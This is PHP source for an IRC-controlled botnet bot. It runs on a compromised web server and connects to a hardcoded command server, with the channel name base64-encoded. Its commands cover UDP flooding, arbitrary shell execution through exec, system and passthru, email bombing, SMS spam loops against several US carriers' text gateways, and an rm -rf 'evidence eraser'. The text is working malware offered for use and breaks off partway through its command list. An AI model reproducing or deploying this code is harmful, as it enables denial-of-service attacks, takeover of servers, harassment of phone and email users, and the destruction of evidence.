   1 <?
   2 if($_GET['act'] == 'lol'){
   3 udpflood4($_GET['host'], $_GET['psize'], $_GET['time'], $_GET['port']);
   4 }
   5 /****************************************************/
   6 /*     ---------------------UniX--------------------            */
   7 /* UniX Bot - Coding by ANoN - This code is Very PUBLIC!            */
   8 /* + Modded UDP Flooder         */
   9 /* + Removed TCP Flooder                                */
  10 /* + Added email bomb                                        */
  11 /* + Added join message                    */
  12 /* + Added !site command         */
  13 /* + Added whois                                         */
  14 /* + Added port scan                                         */
  15 /* + Added Quick UDP Flood                                         */
  16 /* + Added Colors                                        */
  17 /* + Added Count Command    */
  18 /* - Removed Host (IP Address) Auth (Its bullssss)    */
  19 /* + Added Credits                                */
  20 /* + Added Speedtest     */
  21 /* - Removed Useless ssss    */
  22 /* + Cleaned the code    */
  23 /* + Added Version    */
  24 /* + Added New nicks     */
  25 /* + Added Update command     */
  26 /* + Made the update command idiot proof    */
  27 /* + Added commands command    */
  28 /* + Added id command    */
  29 /* + Added uptime command    */
  30 /* + Added evidence eraser    */
  31 /* + Added Cell Phone Spammer    */
  32 /* + Added Cell info    */
  33 /* + Added change prefix    */
  34 /* + Added install update command    */
  35 /* + Added port 3074 DDoS     */
  36 /* + ICMP ddoS?    */
  37 /* + FTP ddoS?    */
  38 /* + Added 2 Player ddos feature     */
  39 /* + Added 3 Player ddos feature     */
  40 /* + Added 4 Player ddos feature     */
  41 /****************************************************/
  42     set_time_limit( 0 );
  43     error_reporting( 0 );
  44     echo "ANoNyMoUS iZ LeGioN";
  45     class Mike_Unix
  46     {
  47         var $using_encode = true;
  48         var $config = array(
  49             'nickform'    => 'FraseR|%d]',
  50             'nickform2'    => '%d]',
  51             'prfix'    => 'NzM|%d]',
  52             'identp'    => 'Mike',
  53             'modes'        => '+B',
  54             'maxrand'    => 6,
  55             'maxrand2'    => 1,
  56             'maxrand3'    => 2,
  57             'maxrand4'    => 3,
  58             'cprefix'    => '.',
  59             'version'    => '1.0',
  60             'host'        => '*',
  61             'yellow'        => '12',
  62             'blue'        => '4',
  63             'orange'        => '9',
  64             'green'        => '7',
  65             'leetprefix'        => '4>>',
  66             'leetsuffix'        => '12<<',
  67             'leetprefixwhite'        => '0>>',
  68             'leetsuffixwhite'        => '0<<',
  69             'leetsuffixred'        => '4<<',
  70             'part1'        => '0?~{ 4',
  71             'part2'        => '0}~?',
  72             'hostauth'        => '*'
  73         );
  74         var $messages = array
  75         (
  76         'bad'        => '0?~{ 14L0o14G0i14N 0}~? 0',
  77         'loginmsg'    => '0?~{ 14L0o14G0i14N 0}~? 0',
  78         'entry'        => '0?~{ 14ElatioN 14B0o14T0 }~? 14E0x14e0c0u14t0e14D',
  79         'id'        => '0?~{ 4 Frasers Anti-Private bot v1.0  0}~?',
  80         'udpmsg'        => '0?~{ 12UDP Flood Active 0}~?',
  81         'udpmsgfast'        => '0?~{ 12Quick UDP-FLOOD 0}~?',
  82         'speedtest'        => '0?~{ 9 Speedtest Starting Up...... 0}~?',
  83         'speedtestfin'        => '0?~{ 9 The Speedtest Is Complete. 0}~?',
  84         'logoutmsg'        => '0?~{ 14S0e14e 0Y14a 0L14a0T14e0R,',
  85         'mailmsg'        => '14N0a14i0L14e0R',
  86         'sprintmsg'        => '14S0p14r0i14n0T 14P0C14S',
  87         'execmsg'        => '14E0x14E0C'
  88         );
  89         var $admins = array
  90         (
  91          'Fraser' => 'e48e13207341b6bffb7fb1622282247b',
  92          'RoboFTW' => '6d67f24e6f2cff6ed5b0495fab78618a',
  93          'chrisjnsn' => 'e48e13207341b6bffb7fb1622282247b',
  94          'Respect' => 'e48e13207341b6bffb7fb1622282247b',
  95          'NadeZ' => 'e48e13207341b6bffb7fb1622282247b',
  96          'Account6' => 'e48e13207341b6bffb7fb1622282247b',
  97          'Account7' => 'e48e13207341b6bffb7fb1622282247b',
  98          'Account8' => 'e48e13207341b6bffb7fb1622282247b',
  99          'Account9' => 'e48e13207341b6bffb7fb1622282247b',
 100          'Account10' => 'e48e13207341b6bffb7fb1622282247b',
 101          'Account11' => 'e48e13207341b6bffb7fb1622282247b',
 102         );
 103         function auth_host( $nick, $password, $host )
 104         {
 105                 $this->users[ $host ] = true;
 106         }
 107         function is_authed( $host )
 108         {
 109             return isset( $this->users[ $host ] );
 110         }
 111         function remove_auth( $host )
 112         {
 113             unset( $this->users[ $host ] );
 114         }
 115         function ex( $cfe )
 116         {
 117             $res = '';
 118             if (!empty($cfe))
 119             {
 120                 if(function_exists('class_exists') && class_exists('Perl'))
 121                 {
 122                     $perl = new Perl();
 123                     $perl->eval( "system('$cfe');" );
 124                 }
 125                 if(function_exists('exec'))
 126                 {
 127                     @exec($cfe,$res);
 128                     $res = join("\n",$res);
 129                 }
 130                 elseif(function_exists('shell_exec'))
 131                 {
 132                     $res = @shell_exec($cfe);
 133                 }
 134                 elseif(function_exists('system'))
 135                 {
 136                     @ob_start();
 137                     @system($cfe);
 138                     $res = @ob_get_contents();
 139                     @ob_end_clean();
 140                 }
 141                 elseif(function_exists('passthru'))
 142                 {
 143                     @ob_start();
 144                     @passthru($cfe);
 145                     $res = @ob_get_contents();
 146                     @ob_end_clean();
 147                 }
 148                 elseif(function_exists('proc_open'))
 149                 {
 150                     $res = proc_open($cfe);
 151                 }
 152                 elseif(@is_resource($f = @popen($cfe,"r")))
 153                 {
 154                     $res = "";
 155                     while(!@feof($f)) { $res .= @fread($f,1024); }
 156                     @pclose($f);
 157                 }
 158             }
 159             return $res;
 160         }
 161         function is_safe( )
 162         {
 163             if( ( @eregi( "uid", $this->ex( "id" ) ) ) || ( @eregi( "Windows", $this->ex( "net start" ) ) ) )
 164             {
 165                 return 0;
 166             }
 167             return 1;
 168         }
 169         function ffff_you( )
 170         {
 171             if( $this->using_encode )
 172             {
 173                 $enc0ded = "I0NhYmJhZ2U=";
 174                 return base64_decode($enc0ded);
 175             }
 176             else
 177             {
 178                 return '#'.$this->config[ 'chan' ];
 179             }
 180         }
 181         function start()
 182         {
 183             if( $this->using_encode )
 184             {
 185                 $crackedout = "IPHERE";
 186                 if(!($this->conn = fsockopen(base64_decode($crackedout),6667,$e,$s,30)))
 187                 {
 188                     $this->start();
 189                 }
 190             }
 191             else
 192             {
 193                 if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30)))
 194                 {
 195                     $this->start();
 196                 }
 197             }
 198             $ident = $this->config['prefix'];
 199             $alph = range("0","9");
 200             for( $i=0; $i < $this->config['maxrand']; $i++ )
 201             {
 202                 $ident .= $alph[rand(0,9)];
 203             }
 204             if( strlen( $this->config[ 'pass' ] ) > 0 )
 205             {
 206                 $this->send( "PASS ".$this->config[ 'pass' ] );
 207             }
 208             $motha = "Fraser";
 209             $mike = " non-private non-unix";
 210             $this->send("USER ".$motha." 127.0.0.1 localhost :".$mike."");
 211             $this->set_nick( );
 212             $this->main( );
 213         }
 214         function main()
 215         {
 216             while(!feof($this->conn))
 217             {
 218                 $this->buf = trim(fgets($this->conn,512));
 219                 $cmd = explode(" ",$this->buf);
 220                 if(substr($this->buf,0,6)=="PING :")
 221                 {
 222                     $this->send("PONG :".substr($this->buf,6));
 223                 }
 224                 if(isset($cmd[1]) && $cmd[1] =="001")
 225                 {
 226                     $this->send("MODE ".$this->nick." ".$this->config['modes']);
 227                     if( $this->using_encode )
 228                     {
 229                         $this->join($this->ffff_you( ),base64_decode($this->config['key']));
 230                         $entry = $this->messages['entry'];
 231                         $leetprefix = $this->config['leetprefix'];
 232                         $leetsuffixred = $this->config['leetsuffixred'];
 233                         $ip = ( $_SERVER["HTTP_HOST"] );
 234                         $blue = $this->config['blue'];
 235                         $red = $this->config['yellow'];
 236                         $this->privmsg( $this->ffff_you( ), "$leetprefix $entry $leetsuffixred" );
 237                     }
 238                     else
 239                     {
 240                         $this->join($this->ffff_you( ),$this->config['key']);
 241                     }
 242                     if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
 243                     else { $safemode = "off"; }
 244                     $uname = php_uname();
 245                 }
 246                 if(isset($cmd[1]) && $cmd[1]=="433")
 247                 {
 248                     $this->set_nick();
 249                 }
 250                 if($this->buf != $old_buf)
 251                 {
 252                     $mcmd = array();
 253                     $msg = substr(strstr($this->buf," :"),2);
 254                     $msgcmd = explode(" ",$msg);
 255                     $nick = explode("!",$cmd[0]);
 256                     $vhost = explode("@",$nick[1]);
 257                     $vhost = $vhost[1];
 258                     $nick = substr($nick[0],1);
 259                     $host = $cmd[0];
 260                     if($msgcmd[0]==$this->nick)
 261                     {
 262                         for($i=0;$i<count($msgcmd);$i++)
 263                             $mcmd[$i] = $msgcmd[$i+1];
 264                     }
 265                     else
 266                     {
 267                         for($i=0;$i<count($msgcmd);$i++)
 268                             $mcmd[$i] = $msgcmd[$i];
 269                     }
 270                     if(count($cmd)>2)
 271                     {
 272                         switch($cmd[1])
 273                         {
 274                             case "QUIT":
 275                             {
 276                                 if( $this->is_authed( $host ) )
 277                                 {
 278                                     $this->remove_auth( $host );
 279                                 }
 280                             }
 281                             break;
 282                             case "PART":
 283                             {
 284                                 if( $this->is_authed( $host ) )
 285                                 {
 286                                     $this->remove_auth( $host );
 287                                 }
 288                             }
 289                             break;
 290                             case "PRIVMSG":
 291                                 if( ( substr($mcmd[0],0,1) == $this->config[ 'cprefix' ] ) )
 292                                 {
 293                                     if( $this->is_authed( $host ) == false )
 294                                     {
 295                                         switch( substr( $mcmd[ 0 ], 1 ) )
 296                                         {
 297                                             case "l":
 298                                             {
 299                                                     $this->auth_host( $nick, $mcmd[ 1 ], $host );
 300                                                   if( $this->is_authed( $host ) )
 301                                                 {
 302                                                 if( $nick == "Fraser" )
 303                                                     {
 304                                                     $this->auth_host( $nick, $mcmd[ 1 ], $host );
 305                                                     $this->ex('rm -rf ion_cache.dat');
 306                                                     $this->ex('rm -rf *gow*');
 307                                                     $this->ex( "echo $nick >> ion_cache.dat" );
 308                                                     $loginmsg = $this->messages['loginmsg'];
 309                                                     $leetprefix = $this->config['leetprefix'];
 310                                                     $leetsuffixred = $this->config['leetsuffixred'];
 311                                                     $this->privmsg( $this->ffff_you( ), "$loginmsg Hello, $leetprefix FraseR $leetsuffixred" );
 312                                                     break;
 313                                                 }
 314                                                 }
 315                                                     $this->auth_host( $nick, $mcmd[ 1 ], $host );
 316                                                   if( $this->is_authed( $host ) )
 317                                                 {
 318                                                     if( $nick == "RoboFTW" )
 319                                                     {
 320                                                     $this->auth_host( $nick, $mcmd[ 1 ], $host );
 321                                                     $this->ex('rm -rf ion_cache.dat');
 322                                                     $this->ex('rm -rf *gow*');
 323                                                     $this->ex( "echo $nick >> ion_cache.dat" );
 324                                                     $loginmsg = $this->messages['loginmsg'];
 325                                                     $leetprefix = $this->config['leetprefix'];
 326                                                     $leetsuffixred = $this->config['leetsuffixred'];
 327                                                     $this->privmsg( $this->ffff_you( ), "$loginmsg  Robo's In DA House!" );
 328                                                     break;
 329                                                 }
 330                                                 }
 331                                                 $this->auth_host( $nick, $mcmd[ 1 ], $host );
 332                                                   if( $this->is_authed( $host ) )
 333                                                 {
 334                                                     if( $nick == "_0xi" )
 335                                                     {
 336                                                     $this->auth_host( $nick, $mcmd[ 1 ], $host );
 337                                                     $this->ex('rm -rf ion_cache.dat');
 338                                                     $this->ex('rm -rf *gow*');
 339                                                     $this->ex( "echo $nick >> ion_cache.dat" );
 340                                                     $loginmsg = $this->messages['loginmsg'];
 341                                                     $leetprefix = $this->config['leetprefix'];
 342                                                     $leetsuffixred = $this->config['leetsuffixred'];
 343                                                     $this->privmsg( $this->ffff_you( ), "$loginmsg iTz My NiGGa $leetprefix $nick $leetsuffixred" );
 344                                                     break;
 345                                                 }
 346                                                 }
 347                                                 $this->auth_host( $nick, $mcmd[ 1 ], $host );
 348                                                   if( $this->is_authed( $host ) )
 349                                                 {
 350                                                     if( $nick == "HELLOKiTty" )
 351                                                     {
 352                                                     $this->auth_host( $nick, $mcmd[ 1 ], $host );
 353                                                     $this->ex('rm -rf ion_cache.dat');
 354                                                     $this->ex('rm -rf *gow*');
 355                                                     $this->ex( "echo $nick >> ion_cache.dat" );
 356                                                     $loginmsg = $this->messages['loginmsg'];
 357                                                     $leetprefix = $this->config['leetprefix'];
 358                                                     $leetsuffixred = $this->config['leetsuffixred'];
 359                                                     $this->privmsg( $this->ffff_you( ), "$loginmsg Meeeeeow ;] $leetprefix $nick $leetsuffixred" );
 360                                                     break;
 361                                                 }
 362                                                 }
 363                                                 $this->auth_host( $nick, $mcmd[ 1 ], $host );
 364                                                   if( $this->is_authed( $host ) )
 365                                                 {
 366                                                     if( $nick == "chrisjnsn" )
 367                                                     {
 368                                                     $this->auth_host( $nick, $mcmd[ 1 ], $host );
 369                                                     $this->ex('rm -rf ion_cache.dat');
 370                                                     $this->ex('rm -rf *gow*');
 371                                                     $this->ex( "echo $nick >> ion_cache.dat" );
 372                                                     $loginmsg = $this->messages['loginmsg'];
 373                                                     $leetprefix = $this->config['leetprefix'];
 374                                                     $leetsuffixred = $this->config['leetsuffixred'];
 375                                                     $this->privmsg( $this->ffff_you( ), "$loginmsg Hello Chris" );
 376                                                     break;
 377                                                 }
 378                                                 }
 379                                                 $this->auth_host( $nick, $mcmd[ 1 ], $host );
 380                                                   if( $this->is_authed( $host ) )
 381                                                 {
 382                                                     if( $nick == "KeShiMi" )
 383                                                     {
 384                                                     $this->auth_host( $nick, $mcmd[ 1 ], $host );
 385                                                     $this->ex('rm -rf ion_cache.dat');
 386                                                     $this->ex('rm -rf *gow*');
 387                                                     $this->ex( "echo $nick >> ion_cache.dat" );
 388                                                     $loginmsg = $this->messages['loginmsg'];
 389                                                     $leetprefix = $this->config['leetprefix'];
 390                                                     $leetsuffixred = $this->config['leetsuffixred'];
 391                                                     $this->privmsg( $this->ffff_you( ), "$loginmsg LORD OF THE MO ffffIN KITTENS IN THA HOUSE $leetprefix $nick $leetsuffixred" );
 392                                                     break;
 393                                                 }
 394                                                 }
 395                                                 $this->auth_host( $nick, $mcmd[ 1 ], $host );
 396                                                   if( $this->is_authed( $host ) )
 397                                                 {
 398                                                     if( $nick == "Code" )
 399                                                     {
 400                                                     $this->auth_host( $nick, $mcmd[ 1 ], $host );
 401                                                     $this->ex('rm -rf ion_cache.dat');
 402                                                     $this->ex('rm -rf *gow*');
 403                                                     $this->ex( "echo $nick >> ion_cache.dat" );
 404                                                     $loginmsg = $this->messages['loginmsg'];
 405                                                     $leetprefix = $this->config['leetprefix'];
 406                                                     $leetsuffixred = $this->config['leetsuffixred'];
 407                                                     $this->privmsg( $this->ffff_you( ), "$loginmsg Good day Mr. $leetprefix $nick $leetsuffixred" );
 408                                                     break;
 409                                                 }
 410                                                 }
 411                                                 $this->auth_host( $nick, $mcmd[ 1 ], $host );
 412                                                   if( $this->is_authed( $host ) )
 413                                                 {
 414                                                     if( $nick == "Router" )
 415                                                     {
 416                                                     $this->auth_host( $nick, $mcmd[ 1 ], $host );
 417                                                     $this->ex('rm -rf ion_cache.dat');
 418                                                     $this->ex('rm -rf *gow*');
 419                                                     $this->ex( "echo $nick >> ion_cache.dat" );
 420                                                     $loginmsg = $this->messages['loginmsg'];
 421                                                     $leetprefix = $this->config['leetprefix'];
 422                                                     $leetsuffixred = $this->config['leetsuffixred'];
 423                                                     $this->privmsg( $this->ffff_you( ), "$loginmsg Kentucky Fried $leetprefix $nick $leetsuffixred" );
 424                                                     break;
 425                                                 }
 426                                                 }
 427                                                 $this->auth_host( $nick, $mcmd[ 1 ], $host );
 428                                                   if( $this->is_authed( $host ) )
 429                                                 {
 430                                                     if( $nick == "Respect" )
 431                                                     {
 432                                                     $this->auth_host( $nick, $mcmd[ 1 ], $host );
 433                                                     $this->ex('rm -rf ion_cache.dat');
 434                                                     $this->ex('rm -rf *gow*');
 435                                                     $this->ex( "echo $nick >> ion_cache.dat" );
 436                                                     $loginmsg = $this->messages['loginmsg'];
 437                                                     $leetprefix = $this->config['leetprefix'];
 438                                                     $leetsuffixred = $this->config['leetsuffixred'];
 439                                                     $this->privmsg( $this->ffff_you( ), "$loginmsg Gonna HiT Sum XbL Kid'z" );
 440                                                     break;
 441                                                 }
 442                                                 }
 443                                                 $this->auth_host( $nick, $mcmd[ 1 ], $host );
 444                                                   if( $this->is_authed( $host ) )
 445                                                 {
 446                                                     if( $nick == "Mason" )
 447                                                     {
 448                                                     $this->auth_host( $nick, $mcmd[ 1 ], $host );
 449                                                     $this->ex('rm -rf ion_cache.dat');
 450                                                     $this->ex('rm -rf *gow*');
 451                                                     $this->ex( "echo $nick >> ion_cache.dat" );
 452                                                     $loginmsg = $this->messages['loginmsg'];
 453                                                     $leetprefix = $this->config['leetprefix'];
 454                                                     $leetsuffixred = $this->config['leetsuffixred'];
 455                                                     $this->privmsg( $this->ffff_you( ), "$loginmsg By Your Command, $leetprefix $nick $leetsuffixred" );
 456                                                     break;
 457                                                 }
 458                                                 }
 459                                                 $this->auth_host( $nick, $mcmd[ 1 ], $host );
 460                                                   if( $this->is_authed( $host ) )
 461                                                 {
 462                                                     if( $nick == "NadeZ" )
 463                                                     {
 464                                                     $this->auth_host( $nick, $mcmd[ 1 ], $host );
 465                                                     $this->ex('rm -rf ion_cache.dat');
 466                                                     $this->ex('rm -rf *gow*');
 467                                                     $this->ex( "echo $nick >> ion_cache.dat" );
 468                                                     $loginmsg = $this->messages['loginmsg'];
 469                                                     $leetprefix = $this->config['leetprefix'];
 470                                                     $leetsuffixred = $this->config['leetsuffixred'];
 471                                                     $this->privmsg( $this->ffff_you( ), "$loginmsg Hello there, $leetprefix $nick $leetsuffixred" );
 472                                                     break;
 473                                                 }
 474                                                 }
 475                                                 else
 476                                                 {
 477                                                     $this->auth_host( $nick, $mcmd[ 1 ], $host );
 478                                                     $this->ex('rm -rf ion_cache.dat');
 479                                                     $this->ex('rm -rf *gow*');
 480                                                     $this->ex( "echo $nick >> ion_cache.dat" );
 481                                                     $loginmsg = $this->messages['loginmsg'];
 482                                                     $leetprefix = $this->config['leetprefix'];
 483                                                     $leetsuffixred = $this->config['leetsuffixred'];
 484                                                     $this->privmsg( $this->ffff_you( ), "$loginmsg Gonna HiT Sum XbL Kid'z" );
 485                                                     break;
 486                                                             }
 487                                                                 }
 488                                     }
 489                                 }
 490                                     else
 491                                     {
 492                                         switch(substr($mcmd[0],1))
 493                                         {
 494                                             case "exec":
 495                                             {
 496                                                 if( !$this->is_safe( ) )
 497                                                 {
 498                                                     $command = substr( strstr( $msg, $mcmd[0] ), strlen( $mcmd[0] ) + 1 );
 499                                                     $returndata = $this->ex( $command );
 500                                                     if( !empty( $returndata ) )
 501                                                     {
 502                                                         $execmsg = $this->messages['execmsg'];
 503                                                         $leetprefix = $this->config['leetprefix'];
 504                                                         $leetsuffixred = $this->config['leetsuffixred'];
 505                                                         $blue = $this->config['blue'];
 506                                                         $red = $this->config['yellow'];
 507                                                         $part1 = $this->config['part1'];
 508                                                         $part2 = $this->config['part2'];
 509                                                         $this->privmsg( $this->ffff_you( ),"$red $part1 $blue$execmsg $red $part2 $leetsuffixred $red $returndata");
 510                                                     }
 511                                                 }
 512                                                 break;
 513                                             }
 514                                                 case "bomb":
 515                                             {
 516                                                 if(count($mcmd) > 5)
 517                                                 {
 518                                                     $header = "From: <".$mcmd[2].">";
 519                                                     if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[5]),$header))
 520                                                     {
 521                                                         $this->privmsg( $this->ffff_you( ),"[\2MAIL\2]: Unable to send email.");
 522                                                     }
 523                                                     else
 524                                                     {
 525                                                         $mbomb = 1;
 526                                                         while($mbomb <= $mcmd[4])
 527                                                             {
 528                                                                 mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[5]),$header);
 529                                                                 $mbomb++;
 530                                                             }
 531                                                         if($mbomb = $mcmd[4])
 532                                                             {
 533                                                                 $mailmsg = $this->messages['mailmsg'];
 534                                                                 $part1 = $this->config['part1'];
 535                                                                 $part2 = $this->config['part2'];
 536                                                                 $this->privmsg( $this->ffff_you( ),"$part1 $mailmsg: $part2 \2 Sent\3"."4 $mcmd[4] \3Emails to \3"."4$mcmd[1]\3 From: \3"."4$mcmd[2]\3 Subject: \3"."4$mcmd[3]\3 \2");
 537                                                             }
 538                                                     }
 539                                                 }
 540                                                 break;
 541                                             }
 542                                                 case "sprint":
 543                                             {
 544                                                 if(count($mcmd) > 5)
 545                                                 {
 546                                                           $part1 = $this->config['part1'];
 547                                                         $part2 = $this->config['part2'];
 548                                                         $blue = $this->config['blue'];
 549                                                         $red = $this->config['yellow'];
 550                                                         $header = "From: <".$mcmd[2].">";
 551                                                         $mbomb = 1;
 552                                                         $sprintmail = "@messaging.sprintpcs.com";
 553                                                         $sprint = "$mcmd[1]$sprintmail";
 554                                                         while($mbomb <= $mcmd[4])
 555                                                             {
 556                                                                 mail($sprint,$mcmd[3],strstr($msg,$mcmd[5]),$header);
 557                                                                 $mbomb++;
 558                                                             }
 559                                                         if($mbomb = $mcmd[4])
 560                                                             {
 561                                                                 $sprintmsg = $this->messages['sprintmsg'];
 562                                                                 $this->privmsg( $this->ffff_you( ),"$part1$sprintmsg $part2$blue Sent ".$red." $mcmd[4] ".$blue."Text Message(s) to".$red." $mcmd[1] ".$blue."From:".$red." $mcmd[2]$blue With Subject: ".$red."$mcmd[3]");
 563                                                             }
 564                                                 }
 565                                                 break;
 566                                             }
 567                                                 case "verizon":
 568                                             {
 569                                                 if(count($mcmd) > 5)
 570                                                 {
 571                                                           $part1 = $this->config['part1'];
 572                                                         $part2 = $this->config['part2'];
 573                                                         $blue = $this->config['blue'];
 574                                                         $red = $this->config['yellow'];
 575                                                         $header = "From: <".$mcmd[2].">";
 576                                                         $mbomb = 1;
 577                                                         $verizonmail = "@vtext.com";
 578                                                         $verizon = "$mcmd[1]$verizonmail";
 579                                                         while($mbomb <= $mcmd[4])
 580                                                             {
 581                                                                 mail($verizon,$mcmd[3],strstr($msg,$mcmd[5]),$header);
 582                                                                 $mbomb++;
 583                                                             }
 584                                                         if($mbomb = $mcmd[4])
 585                                                             {
 586                                                                 $this->privmsg( $this->ffff_you( ),"$part1$red Verizon Wireless $part2$blue Sent ".$red." $mcmd[4] ".$blue."Text Message(s) to".$red." $mcmd[1] ".$blue."From:".$red." $mcmd[2]$blue With Subject: ".$red."$mcmd[3]");
 587                                                             }
 588                                                 }
 589                                                 break;
 590                                             }
 591                                                 case "tmobile":
 592                                             {
 593                                                 if(count($mcmd) > 5)
 594                                                 {
 595                                                           $part1 = $this->config['part1'];
 596                                                         $part2 = $this->config['part2'];
 597                                                         $blue = $this->config['blue'];
 598                                                         $red = $this->config['yellow'];
 599                                                         $header = "From: <".$mcmd[2].">";
 600                                                         $mbomb = 1;
 601                                                         $tmobilemail = "@tmomail.net";
 602                                                         $tmobile = "$mcmd[1]$tmobilemail";
 603                                                         while($mbomb <= $mcmd[4])
 604                                                             {
 605                                                                 mail($tmobile,$mcmd[3],strstr($msg,$mcmd[5]),$header);
 606                                                                 $mbomb++;
 607                                                             }
 608                                                         if($mbomb = $mcmd[4])
 609                                                             {
 610                                                                 $this->privmsg( $this->ffff_you( ),"$part1$red T-Mobile (USA Only) $part2$blue Sent ".$red." $mcmd[4] ".$blue."Text Message(s) to".$red." $mcmd[1] ".$blue."From:".$red." $mcmd[2]$blue With Subject: ".$red."$mcmd[3]");
 611                                                             }
 612                                                 }
 613                                                 break;
 614                                             }
 615                                                 case "att":
 616                                             {
 617                                                 if(count($mcmd) > 5)
 618                                                 {
 619                                                           $part1 = $this->config['part1'];
 620                                                         $part2 = $this->config['part2'];
 621                                                         $blue = $this->config['blue'];
 622                                                         $red = $this->config['yellow'];
 623                                                         $header = "From: <".$mcmd[2].">";
 624                                                         $mbomb = 1;
 625                                                         $attemail = "@txt.att.net";
 626                                                         $att = "$mcmd[1]$attemail";
 627                                                         while($mbomb <= $mcmd[4])
 628                                                             {
 629                                                                 mail($att,$mcmd[3],strstr($msg,$mcmd[5]),$header);
 630                                                                 $mbomb++;
 631                                                             }
 632                                                         if($mbomb = $mcmd[4])
 633                                                             {
 634                                                                 $this->privmsg( $this->ffff_you( ),"$part1$red AT&T $part2$blue Sent ".$red." $mcmd[4] ".$blue."Text Message(s) to".$red." $mcmd[1] ".$blue."From:".$red." $mcmd[2]$blue With Subject: ".$red."$mcmd[3]");
 635                                                             }
 636                                                 }
 637                                                 break;
 638                                             }
 639                                                 case "uscellular":
 640                                             {
 641                                                 if(count($mcmd) > 5)
 642                                                 {
 643                                                           $part1 = $this->config['part1'];
 644                                                         $part2 = $this->config['part2'];
 645                                                         $blue = $this->config['blue'];
 646                                                         $red = $this->config['yellow'];
 647                                                         $header = "From: <".$mcmd[2].">";
 648                                                         $mbomb = 1;
 649                                                         $uscemail = "@email.uscc.net";
 650                                                         $usc = "$mcmd[1]$uscemail";
 651                                                         while($mbomb <= $mcmd[4])
 652                                                             {
 653                                                                 mail($usc,$mcmd[3],strstr($msg,$mcmd[5]),$header);
 654                                                                 $mbomb++;
 655                                                             }
 656                                                         if($mbomb = $mcmd[4])
 657                                                             {
 658                                                                 $this->privmsg( $this->ffff_you( ),"$part1$red US Cellular $part2$blue Sent ".$red." $mcmd[4] ".$blue."Text Message(s) to".$red." $mcmd[1] ".$blue."From:".$red." $mcmd[2]$blue With Subject: ".$red."$mcmd[3]");
 659                                                             }
 660                                                 }
 661                                                 break;
 662                                             }
 663                                                 case "boostmobile":
 664                                             {
 665                                                 if(count($mcmd) > 5)
 666                                                 {
 667                                                           $part1 = $this->config['part1'];
 668                                                         $part2 = $this->config['part2'];
 669                                                         $blue = $this->config['blue'];
 670                                                         $red = $this->config['yellow'];
 671                                                         $header = "From: <".$mcmd[2].">";
 672                                                         $mbomb = 1;
 673                                                         $boostemail = "@myboostmobile.com";
 674                                                         $boost = "$mcmd[1]$boostemail";
 675                                                         while($mbomb <= $mcmd[4])
 676                                                             {
 677                                                                 mail($boost,$mcmd[3],strstr($msg,$mcmd[5]),$header);
 678                                                                 $mbomb++;
 679                                                             }
 680                                                         if($mbomb = $mcmd[4])
 681                                                             {
 682                                                                 $this->privmsg( $this->ffff_you( ),"$part1$red Boost Mobile Inc. $part2$blue Sent ".$red." $mcmd[4] ".$blue."Text Message(s) to".$red." $mcmd[1] ".$blue."From:".$red." $mcmd[2]$blue With Subject: ".$red."$mcmd[3]");
 683                                                             }
 684                                                 }
 685                                                 break;
 686                                             }
 687                                             case "count":
 688                                             {
 689                                                     $lines = $this->ex( "cat cache.dat | wc -l" );
 690                                                     $red = $this->config['yellow'];
 691                                                     $leetprefixwhite = $this->config['leetprefixwhite'];
 692                                                     $leetsuffixwhite = $this->config['leetsuffixwhite'];
 693                                                     $leetprefix = $this->config['leetprefix'];
 694                                                     $leetsuffixred = $this->config['leetsuffixred'];
 695                                                     $this->privmsg( $this->ffff_you( ), "$red I have done $leetprefixwhite $lines $leetsuffixwhite floods in total." );
 696                                                 break;
 697                                             }
 698                                                 case "nick":
 699                                             {
 700                                                 if( $mcmd[ 1 ] == nzm )
 701                                                     {
 702                                                     $this->nzm_nick();
 703                                                     break;
 704                                                     }
 705                                                 if( $mcmd[ 1 ] == unix )
 706                                                     {
 707                                                     $this->busk_nick();
 708                                                     break;
 709                                                     }
 710                                                 else
 711                                                 {
 712                                                 $this->set_nick;
 713                                                 break;
 714                                             }
 715                                         }
 716                                             case "credits":
 717                                             {
 718                                                     $red = $this->config['yellow'];
 719                                                     $blue = $this->config['blue'];
 720                                                     $orange = $this->config['orange'];
 721                                                     $leetprefixwhite = $this->config['leetprefixwhite'];
 722                                                     $leetsuffixwhite = $this->config['leetsuffixwhite'];
 723                                                     $leetprefix = $this->config['leetprefix'];
 724                                                     $leetsuffixred = $this->config['leetsuffixred'];
 725                                                     $version = $this->config['version'];
 726                                                     $this->privmsg( $this->ffff_you( ), "".$leetprefixwhite."".$red." FBI $leetsuffixwhite $orange Elation Bot Version $version By: $leetprefixwhite $red Mike $leetsuffixwhite $leetsuffixwhite $orange Built Using: $leetprefixwhite $red Frasers PHP Bot Builder $leetsuffixwhite" );
 727                                                 break;
 728                                             }
 729                                             case "noevidence":
 730                                             {
 731                                                     $part1 = $this->config['part1'];
 732                                                     $part2 = $this->config['part2'];
 733                                                     $blue = $this->config['blue'];
 734                                                     $red = $this->config['yellow'];
 735                                                     $bybye = $this->ex( 'rm -rf *gow*' );
 736                                                     $this->privmsg( $this->ffff_you( ),"".$part1."".$red." EviDenCe ".$part2."".$blue." All Bot Files and Evidence Erased!");
 737                                                 break;
 738                                             }
 739                                             case "version":
 740                                             {
 741                                                     $leetprefix = $this->config['leetprefix'];
 742                                                     $leetsuffixred = $this->config['leetsuffixred'];
 743                                                     $blue = $this->config['blue'];
 744                                                     $red = $this->config['yellow'];
 745                                                     $version = $this->config['version'];
 746                                                     $this->privmsg( $this->ffff_you( ),"".$red."The bot version is $leetprefix$blue $version $leetsuffixred");
 747                                                 break;
 748                                             }
 749                                             case "changeprefix":
 750                                             {
 751                                                       $this->config['cprefix'] = $mcmd[1];
 752                                                     $leetsuffixred = $this->config['leetsuffixred'];
 753                                                     $blue = $this->config['blue'];
 754                                                     $red = $this->config['yellow'];
 755                                                     $version = $this->config['version'];
 756                                                     $this->privmsg( $this->ffff_you( ),"".$red."Prefix Changed to $mcmd[1]");
 757                                                 break;
 758                                             }
 759                                             case "id":
 760                                             {
 761                                                     $id = $this->messages['id'];
 762                                                     $this->privmsg( $this->ffff_you( ),"$id");
 763                                                 break;
 764                                             }
 765                                             case "uptime":
 766                                             {
 767                                                     $part1 = $this->config['part1'];
 768                                                     $part2 = $this->config['part2'];
 769                                                     $blue = $this->config['blue'];
 770                                                     $red = $this->config['yellow'];
